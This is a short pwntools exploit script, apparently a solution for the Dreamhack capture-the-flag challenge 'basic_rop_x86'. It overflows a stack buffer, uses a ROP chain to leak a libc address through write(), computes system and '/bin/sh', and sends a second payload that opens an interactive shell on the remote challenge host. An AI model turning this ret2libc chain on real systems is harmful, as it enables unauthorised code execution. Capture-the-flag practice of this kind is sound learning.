from pwn import *
# p = process('./basic_rop_x86')
p = remote('host3.dreamhack.games', 18258)
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')


pop_esi_edi_ebp = 0x08048689
main = e.sym['main']
read_plt = e.plt['read']
write_plt = e.plt['write']
read_got = e.got['read']
sh = list(libc.search(b'/bin/sh'))[0]

buf = 0x40 * b'A'
payload = buf + b'A'*8 
# write(1, read_got, 4)
payload+=p32(write_plt)
payload+=p32(pop_esi_edi_ebp)
payload+=p32(1)
payload+=p32(read_got)
payload+=p32(4)
payload+=p32(main)


p.send(payload)
p.recvuntil(buf)
read_lib = u32(p.recv())
libc_base = read_lib - libc.symbols['read']
system = libc_base + libc.symbols['system']
binsh = libc_base + sh
print('read', hex(read_lib))
print('libc_base', hex(libc_base))
# return 2 main
payload=b'A'*0x48
payload+=p32(system)
payload+=p32(0)
payload += p32(binsh)

p.send(payload)
p.interactive()
